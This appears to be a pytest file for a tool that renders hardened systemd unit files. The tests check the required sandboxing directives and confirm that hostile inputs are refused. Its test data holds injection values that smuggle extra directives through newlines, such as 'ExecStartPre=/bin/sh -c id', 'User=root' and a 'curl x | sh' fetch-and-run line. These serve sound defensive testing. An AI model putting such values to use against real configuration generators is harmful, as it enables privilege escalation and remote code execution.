"""systemd unit rendering: required hardening, and hostile values cannot add directives."""

from __future__ import annotations

import json
import os
import re

import pytest
from conftest import run_cli, run_cli_json

from easyui import units
from easyui.errors import UsageError

SAFE: dict = {}

SERVICE_REQUIRED = [
    "User=mes-fitness-web",
    "Group=mes-fitness-web",
    "NoNewPrivileges=yes",
    "ProtectSystem=strict",
    "ProtectHome=yes",
    "PrivateTmp=yes",
    "PrivateDevices=yes",
    "PrivateNetwork=yes",
    "RestrictAddressFamilies=AF_UNIX",
    "CapabilityBoundingSet=",
    "AmbientCapabilities=",
    "SystemCallFilter=@system-service",
    "MemoryMax=256M",
    "UMask=0077",
    "TemporaryFileSystem=/var/lib/mes:ro",
    "BindReadOnlyPaths=/var/lib/mes/fitness/ui",
    "BindPaths=/var/lib/mes/fitness/ui/auth",
    "ExecStart=/usr/local/bin/easy-ui serve --ui-dir /var/lib/mes/fitness/ui",
    "Requires=mes-fitness-web.socket",
    'Environment="HOME=/nonexistent" "MES_CONFIG=/nonexistent"',
]
SOCKET_REQUIRED = [
    "ListenStream=/run/mes/fitness-web.sock",
    "SocketMode=0600",
    "SocketUser=root",
    "Accept=no",
    "WantedBy=sockets.target",
]

ALLOWED_KEYS = {
    "Description", "Requires", "After", "Type", "ExecStart", "User", "Group", "WorkingDirectory", "Environment",
    "UMask", "Restart", "RestartSec", "NoNewPrivileges", "CapabilityBoundingSet", "AmbientCapabilities",
    "RestrictSUIDSGID", "ProtectSystem", "ProtectHome", "PrivateTmp", "PrivateDevices", "DevicePolicy",
    "ProtectKernelTunables", "ProtectKernelModules", "ProtectKernelLogs", "ProtectControlGroups", "ProtectClock",
    "ProtectHostname", "ProtectProc", "ProcSubset", "KeyringMode", "RemoveIPC", "TemporaryFileSystem",
    "BindReadOnlyPaths", "BindPaths", "InaccessiblePaths", "PrivateNetwork", "RestrictAddressFamilies",
    "IPAddressDeny", "SystemCallFilter", "SystemCallErrorNumber", "SystemCallArchitectures", "RestrictNamespaces",
    "RestrictRealtime", "LockPersonality", "MemoryDenyWriteExecute", "MemoryMax", "TasksMax", "LimitNOFILE",
    "LimitCORE", "ListenStream", "SocketUser", "SocketGroup", "SocketMode", "DirectoryMode", "RemoveOnStop",
    "Accept", "WantedBy",
}


def parse_unit(text: str) -> list[tuple[str, str, str]]:
    """(section, key, value) for every directive; asserts every line is a comment, section, blank or directive."""
    out, section = [], None
    for line in text.split("\n"):
        if not line or line.startswith("#"):
            continue
        m = re.match(r"^\[(\w+)\]$", line)
        if m:
            section = m.group(1)
            continue
        m = re.match(r"^([A-Za-z]+)=(.*)$", line)
        assert m, f"unexpected line: {line!r}"
        out.append((section, m.group(1), m.group(2)))
    return out


def test_render_defaults():
    u = units.render_units("fitness", title="My fitness", **SAFE)
    assert list(u) == ["mes-fitness-web.socket", "mes-fitness-web.service"]
    service, sock = u["mes-fitness-web.service"], u["mes-fitness-web.socket"]
    lines_service, lines_socket = service.split("\n"), sock.split("\n")
    for need in SERVICE_REQUIRED:
        assert need in lines_service, need
    for need in SOCKET_REQUIRED:
        assert need in lines_socket, need
    for text in u.values():
        for section, key, value in parse_unit(text):
            assert key in ALLOWED_KEYS, key
    assert "[Install]" not in service.split("\n")  # starts only through the socket, never at boot
    assert "[Install]" in sock.split("\n")
    assert "Description=easy-ui dashboards for My fitness (fitness)" in lines_service
    keys = [k for _s, k, _v in parse_unit(service)]
    assert keys.count("ExecStart") == 1 and "ExecStartPre" not in keys and "ExecStartPost" not in keys


def test_no_shell_in_execstart():
    service = units.render_units("fitness", **SAFE)["mes-fitness-web.service"]
    exec_line = next(v for _s, k, v in parse_unit(service) if k == "ExecStart")
    assert not re.search(r"\b(sh|bash|zsh)\b|-c\b|[;&|`]", exec_line)
    assert exec_line.split()[0].startswith("/")


def test_options():
    u = units.render_units("fitness", exec_path="/opt/easy-ui/bin/easy-ui", root="/srv/mes", socket_path="/run/eui/fit.sock",
                           socket_owner="tailscale", memory_max="128M")
    service, sock = u["mes-fitness-web.service"], u["mes-fitness-web.socket"]
    assert "User=mes-fitness-web" in service and "MemoryMax=128M" in service
    assert "ExecStart=/opt/easy-ui/bin/easy-ui serve --ui-dir /srv/mes/fitness/ui" in service
    assert "TemporaryFileSystem=/srv/mes:ro" in service and "BindPaths=/srv/mes/fitness/ui/auth" in service
    assert "ListenStream=/run/eui/fit.sock" in sock and "SocketUser=tailscale" in sock


HOSTILE_APPS = [
    "fitness\nExecStartPre=/bin/sh",
    "fit ness",
    "../etc",
    "Fitness",
    "",
    "a",
    "fit%n",
    "fit$USER",
    "x" * 32,
    "fit;rm",
    "fitness\r",
    None,
    7,
]


@pytest.mark.parametrize("app", HOSTILE_APPS)
def test_hostile_app_names_are_refused(app):
    with pytest.raises(UsageError):
        units.render_units(app, **SAFE)


HOSTILE_PATHS = [
    "/srv/apps/x\nExecStartPre=/bin/sh -c id",
    "/srv/apps/x\rUser=root",
    "/srv/apps/my app",
    "/srv/apps/$HOME",
    "/srv/apps/%h",
    "/srv/a:/etc",
    "/srv/../etc",
    "/srv/./x",
    "relative/path",
    "~/apps",
    "/srv/apps/",
    "//srv/apps",
    "/srv//apps",
    '/srv/"x"',
    "/srv/x;id",
    "/srv/x\\ny",
    "/srv/x\x00",
    "/",
    "",
    "/srv/caf\u00e9",
    None,
]


@pytest.mark.parametrize(
    "field,path",
    [(f, p) for f in ("exec_path", "root", "socket_path") for p in HOSTILE_PATHS
     if not (f == "socket_path" and not p)],  # an empty socket path means the default one
)
def test_hostile_paths_are_refused(field, path):
    kwargs = {**SAFE, field: path}
    with pytest.raises(UsageError):
        units.render_units("fitness", **kwargs)


@pytest.mark.parametrize("user", ["root\nUser=root", "Root", "1abc", "a b", "x" * 33, "a$b", "a%b", "", 5])
def test_hostile_users_are_refused(user):
    with pytest.raises(UsageError):
        units.render_units("fitness", socket_owner=user, **SAFE)


@pytest.mark.parametrize("mem", ["256", "256MB", "-1M", "0M", "1T", "256M\nUser=root", "", 256])
def test_bad_memory(mem):
    with pytest.raises(UsageError):
        units.render_units("fitness", memory_max=mem, **SAFE)


@pytest.mark.parametrize("title", [
    "Evil\nExecStartPre=/bin/sh -c 'curl x | sh'",
    "Evil\r\n[Service]\nUser=root",
    "100% %h %n $HOME ${PATH} \\x41",
    "tab\tand\x00nul\x1b[31m",
    "\u2028line separator\u2029",
])
def test_hostile_title_stays_one_safe_line(title):
    u = units.render_units("fitness", title=title, **SAFE)
    for text in u.values():
        parsed = parse_unit(text)
        for _s, key, _v in parsed:
            assert key in ALLOWED_KEYS
        assert [k for _s, k, _v in parsed].count("User") <= 1
        desc = [v for _s, k, v in parsed if k == "Description"]
        assert len(desc) == 1
        d = desc[0]
        # every % and $ is doubled (no specifier or variable expansion), no control characters
        assert not re.search(r"(?<!%)%(?!%)", d.replace("%%", ""))
        assert "$" not in d.replace("$$", "")
        assert all(c.isprintable() for c in d)
    service = u["mes-fitness-web.service"]
    keys = [k for _s, k, _v in parse_unit(service)]
    assert keys.count("User") == 1 and "ExecStartPre" not in keys
    assert [line for line in service.split("\n") if line.startswith("[")] == ["[Unit]", "[Service]"]


def test_escape_value_and_clean_text():
    assert units.escape_value("100%") == "100%%"
    assert units.escape_value("$HOME") == "$$HOME"
    assert units.escape_value("a\\b") == "a\\\\b"
    for bad in ("a\nb", "a\rb", "a\x00b"):
        with pytest.raises(UsageError):
            units.escape_value(bad)
    assert units.clean_text("a\nb\tc") == "a b c"
    assert len(units.clean_text("x" * 500)) == 80


def test_home_folders_are_refused():
    for field, value in (("root", "/home/someone/mes"), ("exec_path", "/home/someone/.local/bin/easy-ui"),
                         ("root", "/run/user/1000/mes")):
        with pytest.raises(UsageError) as ei:
            units.render_units("fitness", **{**SAFE, field: value})
        assert "home folder" in ei.value.message


@pytest.mark.parametrize("kw", [
    {"exec_path": "/var/lib/mes/fitness/code/current/.venv/bin/easy-ui"},
    {"exec_path": "/tmp/easy-ui"},
    {"socket_path": "/var/lib/mes/fitness/ui/web.sock"},
    {"socket_owner": "mes-fitness"},
    {"socket_owner": "www-data"},
])
def test_places_and_owners_the_project_account_controls_are_refused(kw):
    with pytest.raises(UsageError):
        units.render_units("fitness", **{**SAFE, **kw})


def test_long_project_names_are_refused_for_servers():
    ok = "a" * 24  # mes-<24>-web is 32 characters
    assert f"User=mes-{ok}-web" in units.render_units(ok)[f"mes-{ok}-web.service"]
    with pytest.raises(UsageError) as ei:
        units.render_units("a" * 25)
    assert ei.value.code == "name_too_long"


def test_folders_for_the_administrator():
    f = {d["path"]: d for d in units.folders("fitness")}
    assert f["/var/lib/mes/fitness/ui/auth"] == {
        "path": "/var/lib/mes/fitness/ui/auth", "owner": "mes-fitness-web", "group": "mes-fitness-web", "mode": "0700",
        "why": f["/var/lib/mes/fitness/ui/auth"]["why"],
    }
    for p in ("/var/lib/mes/fitness/ui", "/var/lib/mes/fitness/ui/data", "/var/lib/mes/fitness/ui/specs"):
        assert (f[p]["owner"], f[p]["group"], f[p]["mode"]) == ("mes-fitness", "mes-fitness-web", "2750")
    assert f["/var/lib/mes/fitness"]["mode"] == "0710"
    text = units.render_units("fitness")["mes-fitness-web.service"]
    assert "/var/lib/mes/fitness/ui/auth" in text.split("[Unit]")[0]  # also in the header comment


def test_write_units(tmp_path):
    u = units.render_units("fitness", **SAFE)
    written = units.write_units(u, tmp_path / "out")
    assert sorted(os.path.basename(p) for p in written) == ["mes-fitness-web.service", "mes-fitness-web.socket"]
    assert (tmp_path / "out" / "mes-fitness-web.service").read_text() == u["mes-fitness-web.service"]


def test_write_units_does_not_follow_links(tmp_path):
    out = tmp_path / "out"
    out.mkdir()
    victim = tmp_path / "victim"
    victim.write_text("keep me")
    os.symlink(victim, out / "mes-fitness-web.socket")
    with pytest.raises(UsageError):
        units.write_units(units.render_units("fitness", **SAFE), out)
    assert victim.read_text() == "keep me"
    os.symlink(out, tmp_path / "linkdir")
    with pytest.raises(UsageError):
        units.write_units(units.render_units("fitness", **SAFE), tmp_path / "linkdir")


# ---------------------------------------------------------------- command line


def test_cli_requires_render_only(demo_app):
    code, data = run_cli_json("units")
    assert code == 6 and data["error"]["code"] == "needs_human"


def test_cli_render_json(demo_app):
    code, data = run_cli_json("units", "--render-only")
    assert code == 0 and data["app"] == data["project"] == "demo" and data["written"] == []
    assert data["accounts"] == {"project": "mes-demo", "web": "mes-demo-web"}
    assert data["ui_dir"] == "/var/lib/mes/demo/ui" and data["enable"] == ["mes-demo-web.socket"]
    assert data["socket"] == "/run/mes/demo-web.sock" and len(data["folders"]) == 5
    assert "ExecStart=/usr/local/bin/easy-ui serve --ui-dir /var/lib/mes/demo/ui" in data["units"]["mes-demo-web.service"]


def test_cli_render_text_and_out(demo_app, tmp_path):
    code, out, _ = run_cli("units", "--render-only")
    assert code == 0 and "### mes-demo-web.socket" in out and "### mes-demo-web.service" in out
    code, out, _ = run_cli("units", "--render-only", "--root", "/srv/mes", "--out", str(tmp_path / "u"), "--json",
                           "--allow-host", "box.example.ts.net")
    data = json.loads(out)
    assert code == 0 and len(data["written"]) == 2
    text = (tmp_path / "u" / "mes-demo-web.service").read_text()
    assert "BindReadOnlyPaths=/srv/mes/demo/ui" in text and 'EASYUI_ALLOW_HOSTS=box.example.ts.net"' in text


def test_cli_hostile_option(demo_app):
    code, data = run_cli_json("units", "--render-only", "--root", "/srv/x\nUser=root")
    assert code == 2 and data["error"]["code"] == "usage"
